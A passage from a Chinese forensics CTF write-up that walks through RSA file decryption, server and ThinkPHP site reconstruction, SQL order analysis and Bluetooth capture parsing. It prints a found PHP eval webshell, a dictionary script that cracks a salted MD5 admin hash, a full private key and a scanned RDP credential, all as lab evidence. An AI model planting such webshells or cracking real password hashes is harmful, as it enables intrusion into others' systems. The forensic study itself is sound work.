alt="image-20250427151518537"></p><p>直接丢给AI分析一下，得知是RSA</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RSA</span><br></pre></td></tr></table></figure><h3 id="T48"><a href="#T48" class="headerlink" title="T48"></a>T48</h3><blockquote><p>分析GIFT.exe，请解密test.love得到flag4(格式：flag4{xxxxxxxx})</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250428110940796.png" alt="image-20250428110940796"></p><p>我们在love.jpeg中发现了RSA的私钥。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIBVAIBADANBgkqhkiG9w0BAQEFAASCAT4wggE6AgEAAkEAjMqVpy4zP9cO5m/y</span><br><span class="line">w0wmvdLzpUc4FNnUgpKJ26YimfDtA1cTZanNlxbmM25OTPsg2SaRUZdq7M3oGUel</span><br><span class="line">gmRdFwIDAQABAkBYVtCZympLt0PZIQsAsWppltBbtxkgNCGcIBgx4sc5MT03erss</span><br><span class="line">eyh2TqtQyO4aPYiOUUOWYw9hL4G6GFosXc+JAiEAvegkAhLXptnMlwCuwScK233w</span><br><span class="line">cbBcxKWWPgZckdHkGPsCIQC9ynkuhrI4j2nc2eItr1NoU3Y1sfv0I601iNK1YXMJ</span><br><span class="line">lQIgTYlomkgjMIagl865izdroW5sK578YXXSQATM6uStot0CIQCih1DNaiYXT6FN</span><br><span class="line">sv0BOIKJ9edmRjxIr4C2NqyTDZfRHQIgUUhesxSUmNdc5QzckCAozLdPAlcAy7q+</span><br><span class="line">k5ag7Oxp0r0=</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure><p>然后我们用赛博厨子试试？搞不了，让AI给我们一个逆向解密脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_v1_5</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rsa_decrypt_file</span>(<span class="params">encrypted_file_path, decrypted_file_path, private_key_path</span>):</span><br><span class="line">    <span class="comment"># 读取私钥</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(private_key_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        private_key = RSA.import_key(f.read())</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 初始化解密器 (PKCS#1 v1.5)</span></span><br><span class="line">    cipher = PKCS1_v1_5.new(private_key)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 读取加密文件并分块解密</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(encrypted_file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f_in, <span class="built_in">open</span>(decrypted_file_path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f_out:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="comment"># 读取一个加密块（长度 = 密钥长度，如 256 字节对 2048 位 RSA）</span></span><br><span class="line">            chunk = f_in.read(private_key.size_in_bytes())</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> chunk:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 解密当前块</span></span><br><span class="line">            decrypted_chunk = cipher.decrypt(chunk, <span class="literal">None</span>)  <span class="comment"># 无填充提示</span></span><br><span class="line">            <span class="keyword">if</span> decrypted_chunk <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">&quot;解密失败（可能是密钥不匹配或填充错误）&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 写入解密数据</span></span><br><span class="line">            f_out.write(decrypted_chunk)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">4</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;用法: <span class="subst">&#123;sys.argv[<span class="number">0</span>]&#125;</span> &lt;加密文件&gt; &lt;解密输出文件&gt; &lt;私钥文件&gt;&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    encrypted_file = sys.argv[<span class="number">1</span>]</span><br><span class="line">    decrypted_file = sys.argv[<span class="number">2</span>]</span><br><span class="line">    private_key_file = sys.argv[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        rsa_decrypt_file(encrypted_file, decrypted_file, private_key_file)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;解密完成！&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\TY\Desktop&gt;python study.py test.love test key.txt</span><br><span class="line">解密完成！</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag4&#123;104864DF-C420-04BB5F51F267&#125;</span><br></pre></td></tr></table></figure><h2 id="服务器部分"><a href="#服务器部分" class="headerlink" title="服务器部分"></a>服务器部分</h2><h3 id="T49"><a href="#T49" class="headerlink" title="T49"></a>T49</h3><blockquote><p>该电脑最早的开机时间是什么(格式：2025&#x2F;1&#x2F;1 01:01:01)</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250428111004680.png" alt="image-20250428111004680"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2022-02-23 12:23:49</span><br></pre></td></tr></table></figure><h3 id="T50"><a href="#T50" class="headerlink" title="T50"></a>T50</h3><blockquote><p>服务器操作系统内核版本(格式：1.1.1-123)</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250427155434622.png" alt="image-20250427155434622"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3.10.0-1160.119.1.el7.x86_64</span><br></pre></td></tr></table></figure><h3 id="T51"><a href="#T51" class="headerlink" title="T51"></a>T51</h3><blockquote><p>除系统用户外，总共有多少个用户(格式：1)</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250427160225034.png" alt="image-20250427160225034"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3</span><br></pre></td></tr></table></figure><h3 id="T52"><a href="#T52" class="headerlink" title="T52"></a>T52</h3><blockquote><p>分析起早王的服务器检材，Trojan服务器混淆流量所使用的域名是什么(格式：xxx.xxx)</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250427160521869.png" alt="image-20250427160521869"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wyzshop1.com</span><br></pre></td></tr></table></figure><h3 id="T53"><a href="#T53" class="headerlink" title="T53"></a>T53</h3><blockquote><p>分析起早王的服务器检材，Trojan服务运行的模式为：A、foward B、nat C、server D、client  </p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250427160949827.png" alt="image-20250427160949827"></p><p>examples目录下存在四种运行模式</p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250427161213824.png" alt="image-20250427161213824"></p><p>发现只有nat.json-example的和上一级目录的config.json一样。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">B</span><br></pre></td></tr></table></figure><h3 id="T54"><a href="#T54" class="headerlink" title="T54"></a>T54</h3><blockquote><p>关于 Trojan服务器配置文件中配置的remote_addr 和 remote_port 的作用，正确的是： A. 代理流量转发到外部互联网服务器 B. 将流量转发到本地的 HTTP 服务（如Nginx） C. 用于数据库连接 D. 加密流量解密后的目标地址</p></blockquote><p>我们需要先知道Trojan服务器是什么</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Trojan是什么? &quot;Trojan&quot;作为科学上网技术，指的是一种网络代理服务，它的名字来源于木马概念，旨在通过伪装成正常的流量来逃避检测和干预。 这种服务通常使用在国家防火墙等网络审查制度较严格的环境中，以帮助用户访问被屏蔽或被限制的网站和服务。</span><br></pre></td></tr></table></figure><p>一眼A</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A</span><br></pre></td></tr></table></figure><h3 id="T55"><a href="#T55" class="headerlink" title="T55"></a>T55</h3><blockquote><p>分析网站后台登录密码的加密逻辑，给出密码sbwyz1加密后存在数据库中的值(格式：1a2b3c4d)</p></blockquote><p>网站是存在宝塔的，我们重构一下网站。</p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250427161931268.png" alt="image-20250427161931268"></p><p>从计算机检材的E盘我们可以获得网站数据库</p><p>我们先将宝塔面板的密码改成<code>123456</code></p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250427162755341.png" alt="image-20250427162755341"></p><p>接着我们登录宝塔面板导入数据库</p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250427163103312.png" alt="image-20250427163103312"></p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250427163114171.png" alt="image-20250427163114171"></p><p>导入成功后我们回到宝塔面板，为网站添加一个域名</p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250428111239079.png" alt="image-20250428111239079"></p><p>接着我们找到网站的数据库文件，database.php，改一下连接的用户名密码</p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250427163530424.png" alt="image-20250427163530424"></p><p>然后我们访问一下192.168.79.130，发现访问成功啦。网站也就重构成功了。</p><p>接下来我们找一下后台登陆的相关文件<code>www.tpshop.com\application\admin\controller\admin.php</code></p><p>由于这是thinkphp网站，我们直接访问192.168.79.130&#x2F;index.php&#x2F;admin，也就是后台网站，它会跳转到<a href="http://192.168.79.130/index.php/Admin/Admin/login.html%EF%BC%8C%E8%BF%99%E5%85%B6%E5%AE%9E%E5%B0%B1%E6%98%AF%E5%90%8E%E5%8F%B0%E7%9A%84%E7%99%BB%E9%99%86%E7%95%8C%E9%9D%A2%E3%80%82">http://192.168.79.130/index.php/Admin/Admin/login.html，这其实就是后台的登陆界面。</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">C</span>(<span class="string">&quot;AUTH_CODE&quot;</span>).<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们发现加密逻辑就是在输入的密码前加上AUTH_CODE，然后进行一次md5加密</p><p>然后我们全局搜AUTH_CODE</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;AUTH_CODE&#x27; =&gt; &quot;TPSHOP&quot;, //安装完毕之后不要改变，否则所有密码都会出错</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250427164841319.png" alt="image-20250427164841319"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f8537858eb0eabada34e7021d19974ea</span><br></pre></td></tr></table></figure><h3 id="T56"><a href="#T56" class="headerlink" title="T56"></a>T56</h3><blockquote><p>网站后台显示的服务器GD版本是多少(格式：1.1.1 abc)</p></blockquote><p>这里我们需要知道后台密码，目前我们已知的是admin用户名以及密码的加密形式</p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250427164955135.png" alt="image-20250427164955135"></p><p>爆破一下密码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">res=<span class="string">&quot;35f834d6b70c29ed050520d1f94c829c&quot;</span></span><br><span class="line">SALT=<span class="string">&quot;TPSHOP&quot;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;F:\\字典\\rockyou.txt&quot;</span>, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;latin1&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    dicta=f.read().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> dicta:</span><br><span class="line">    pwd=SALT+i</span><br><span class="line">    passa=hashlib.md5(pwd.encode()).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> passa==res:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">        </span><br></pre></td></tr></table></figure><p>得到密码<code>abcdefghijklmn</code></p><p>然后我们登录后台</p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250427170024722.png" alt="image-20250427170024722"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2.1.0 compatible</span><br></pre></td></tr></table></figure><h3 id="T57"><a href="#T57" class="headerlink" title="T57"></a>T57</h3><blockquote><p>网站后台中2016-04-01 00:00:00到2025-04-01 00:00:00订单列表有多少条记录(格式：1)</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250427170238531.png" alt="image-20250427170238531"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1292</span><br></pre></td></tr></table></figure><h3 id="T58"><a href="#T58" class="headerlink" title="T58"></a>T58</h3><blockquote><p>在网站购物满多少免运费(格式：1)</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250427170350924.png" alt="image-20250427170350924"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">100000</span><br></pre></td></tr></table></figure><h3 id="T59"><a href="#T59" class="headerlink" title="T59"></a>T59</h3><blockquote><p>分析网站日志，成功在网站后台上传木马的攻击者IP是多少(格式：1.1.1.1)</p></blockquote><p>先D盾扫一下</p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250428111329483.png" alt="image-20250428111329483"></p><p>看网站目录下的发现有个peiqi.php，小猪佩奇。一眼一句话木马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;peiqi&#x27;</span>])<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>接下来我们去日志搜一下。</p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250427170837647.png" alt="image-20250427170837647"></p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250427170906686.png" alt="image-20250427170906686"></p><p>一眼222.2.2.2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">222.2.2.2</span><br></pre></td></tr></table></figure><h3 id="T60"><a href="#T60" class="headerlink" title="T60"></a>T60</h3><blockquote><p>攻击者插入的一句话木马文件的sha256值是多少(格式：大写sha256)</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250427171201548.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A4AC767E7E17C89B45557D623C527B7B</span><br></pre></td></tr></table></figure><h3 id="T61"><a href="#T61" class="headerlink" title="T61"></a>T61</h3><blockquote><p>攻击者使用工具对内网进行扫描后，rdp扫描结果中的账号密码是什么(格式：abc:def)</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250427171344040.png"></p><p>我们发现application目录下有一些神奇的东西，PwnKit和goon</p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250428111512517.png"></p><p>goon是扫描工具，pwnkit是一个内网的漏洞利用工具</p><p>我们发现result.txt，存放了扫描结果！</p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250427171508182.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">administrator:Aa123456@</span><br></pre></td></tr></table></figure><h3 id="T62"><a href="#T62" class="headerlink" title="T62"></a>T62</h3><blockquote><p>对于每个用户，计算其注册时间（用户表中的注册时间戳）到首次下单时间（订单表中最早时间戳）的间隔，找出间隔最短的用户id。（格式：1）</p></blockquote><p>我们在数据库中发现了tp_users表，里面存在注册时间，首次下单时间等</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT u.user_id,MIN(o.create_time)-u.reg_time as diff</span><br><span class="line">FROM tp_users u</span><br><span class="line">JOIN tp_delivery_doc o ON u.user_id=o.user_id</span><br><span class="line">GROUP BY u.user_id</span><br><span class="line">ORDER BY diff ASC</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250427172817919.png" alt="image-20250427172817919"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">180</span><br></pre></td></tr></table></figure><h3 id="T63"><a href="#T63" class="headerlink" title="T63"></a>T63</h3><blockquote><p>统计每月订单数量，找出订单最多的月份（XXXX年XX月）</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">SELECT</span><br><span class="line"> EXTRACT(YEAR FROM FROM_UNIXTIME(o.create_time)) as year,</span><br><span class="line"> EXTRACT(MONTH FROM FROM_UNIXTIME(o.create_time)) as month,</span><br><span class="line"> COUNT(*) as order_count </span><br><span class="line">FROM tp_delivery_doc o</span><br><span class="line">GROUP BY year, month</span><br><span class="line">ORDER BY order_count DESC</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250427194308972.png" alt="image-20250427194308972"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2017年1月</span><br></pre></td></tr></table></figure><h3 id="T64"><a href="#T64" class="headerlink" title="T64"></a>T64</h3><blockquote><p>找出连续三天内下单的用户并统计总共有多少个（格式：1）</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">SELECT </span><br><span class="line">    t1.user_id,</span><br><span class="line">    MIN(FROM_UNIXTIME(t1.add_time)) AS earliest_order_date</span><br><span class="line">FROM </span><br><span class="line">    tp_order t1</span><br><span class="line">WHERE EXISTS (</span><br><span class="line">    SELECT 1</span><br><span class="line">    FROM tp_order t2</span><br><span class="line">    WHERE t2.user_id = t1.user_id</span><br><span class="line">    AND FROM_UNIXTIME(t1.add_time) &gt; FROM_UNIXTIME(t2.add_time)</span><br><span class="line">    AND DATEDIFF(FROM_UNIXTIME(t1.add_time), FROM_UNIXTIME(t2.add_time)) &lt;= 3</span><br><span class="line">)</span><br><span class="line">GROUP BY </span><br><span class="line">    t1.user_id</span><br><span class="line">ORDER BY </span><br><span class="line">t1.user_id;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250427194446480.png" alt="image-20250427194446480"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">110</span><br></pre></td></tr></table></figure><h2 id="流量分析部分"><a href="#流量分析部分" class="headerlink" title="流量分析部分"></a>流量分析部分</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">（提示：侦查人员自己使用的蓝牙设备有QC35 II耳机和RAPOO键盘）</span><br></pre></td></tr></table></figure><h3 id="T65"><a href="#T65" class="headerlink" title="T65"></a>T65</h3><blockquote><p>请问侦查人员是用哪个接口进行抓到蓝牙数据包的（格式：DVI1-2.1）</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250428084739861.png" alt="image-20250428084739861"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">COM3-3.6</span><br></pre></td></tr></table></figure><h3 id="T66"><a href="#T66" class="headerlink" title="T66"></a>T66</h3><blockquote><p>起早王有一个用于伪装成倩倩耳机的蓝牙设备，该设备的原始设备名称为什么（格式：XXX_xxx 具体大小写按照原始内容）</p></blockquote><p>这⾥⽤ tshark 导出流量为 json 格式，便于搜索和分析。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\tshark.exe -r B:\BLE -T json &gt; result.json</span><br></pre></td></tr></table></figure><p>然后我们去官网看一下蓝牙格式的相关信息。<a href="https://www.wireshark.org/docs/dfref/b/btcommon.html">https://www.wireshark.org/docs/dfref/b/btcommon.html</a></p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250428085620200.png" alt="image-20250428085620200"></p><p>设备名称对应的就是<code>btcommon.eir_ad.entry.device_name</code></p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250428111759451.png" alt="image-20250428111759451"></p><p>然后我们导出一下所有的设备名称</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_device_names</span>(<span class="params">file_path</span>):</span><br><span class="line">    device_names = <span class="built_in">set</span>()</span><br><span class="line">    pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;&quot;btcommon\.eir_ad\.entry\.device_name&quot;:\s*&quot;([^&quot;]+)&quot;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-16&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            <span class="keyword">for</span> line <span class="keyword">in</span> file:</span><br><span class="line">                matches = pattern.findall(line)</span><br><span class="line">                device_names.update(matches)  <span class="comment"># 直接更新集合</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> device_names:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;⚠️ 未找到任何设备名称，请检查文件格式！&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;✅ 提取的设备名称列表：&quot;</span>)</span><br><span class="line">            <span class="keyword">for</span> name <span class="keyword">in</span> <span class="built_in">sorted</span>(device_names):</span><br><span class="line">                <span class="built_in">print</span>(name)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;❌ 错误：文件 <span class="subst">&#123;file_path&#125;</span> 不存在！&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;❌ 编码错误，请尝试用 &#x27;utf-16&#x27; 或 &#x27;latin1&#x27; 打开文件&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;result.json&quot;</span>  <span class="comment"># 确保路径正确</span></span><br><span class="line">extract_device_names(file_path)</span><br></pre></td></tr></table></figure><p>结果如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span 